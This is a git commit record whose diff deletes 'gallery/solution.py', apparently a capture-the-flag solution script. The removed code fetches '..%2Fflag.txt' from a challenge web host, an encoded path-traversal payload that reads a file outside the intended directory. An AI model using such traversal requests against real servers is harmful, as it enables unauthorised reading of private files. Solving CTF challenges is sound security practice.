1df7cfefcd7ba17469051639aad2ad9111003653
senlmorphine <96277522+senlmorphine@users.noreply.github.com>
2022-05-25 07:42:46 -0400

    Delete gallery directory

--- gallery/solution.py
+++
@@ -1,5 +0,0 @@
-import urllib.request
-
-# Just a simple little file traversal
-BASEHREF = 'https://photoable.tjc.tf'
-print(urllib.request.urlopen('{}/image/..%2Fflag.txt/download'.format(BASEHREF)).read().decode('utf-8'))
